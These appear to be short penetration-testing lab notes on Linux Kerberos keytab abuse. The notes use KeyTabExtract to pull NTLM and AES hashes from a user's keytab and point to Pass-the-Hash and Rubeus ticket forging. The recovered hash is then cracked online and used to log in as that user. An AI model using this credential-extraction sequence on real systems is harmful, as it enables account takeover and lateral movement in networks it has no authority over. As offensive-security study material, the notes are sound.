# EXTRACTING
`https://github.com/sosdave/KeyTabExtract`
```
python3 /opt/keytabextract.py /opt/specialfiles/luser.keytab
```
>[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.  
>[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.  
>[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.  
>[+] Keytab File successfully imported.  
>        REALM : TEST.GB  
>        SERVICE PRINCIPAL : luser/  
>        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60  
>        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f  
>        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4  

- with the `NTLM hash`, we can perform a Pass the Hash attack. 
- `AES256` or `AES128 hash`, we can forge our tickets using rubeus or attempt to crack the hashes to obtain the plaintext password
- a KeyTab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.





# CRACKING
`https://www.crackstation.net`
>password





# LOGIN & TESTING
```
su - luser@test.de
klist
```
>Ticket cache: FILE:/tmp/krb5cc_647402606_ZX6KFA  
>Default principal: luser@TEST.DE  
>Valid starting       Expires              Service principal  
>10/07/2022 11:01:13  10/07/2022 21:01:13  krbtgt/TEST.DE@TEST.DE  
>        renew until 10/08/2022 11:01:13  




















